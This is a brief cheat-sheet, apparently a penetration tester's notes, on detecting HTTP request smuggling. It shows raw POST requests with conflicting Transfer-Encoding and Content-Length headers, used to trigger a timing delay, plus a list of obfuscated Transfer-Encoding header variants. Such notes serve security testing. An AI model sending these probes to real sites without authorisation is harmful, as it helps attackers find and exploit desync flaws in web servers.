### if a time delay occurs the site might be vulnerable
```
POST / HTTP/1.1
Host: <domain>
Transfer-Encoding: chunked
Content-Length: 4

1  
Z  
Q  
```

### again provoce time delay
```
POST / HTTP/1.1
Host: <domain>
Transfer-Encoding: chunked
Content-Length: 6

0  

X  
```


### some different chung encoding templates:
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked  

Transfer-Encoding: chunked  

Transfer-Encoding: x  

Transfer-Encoding:[tab]chunked  

X: X[\n]Transfer-Encoding: chunked  
```

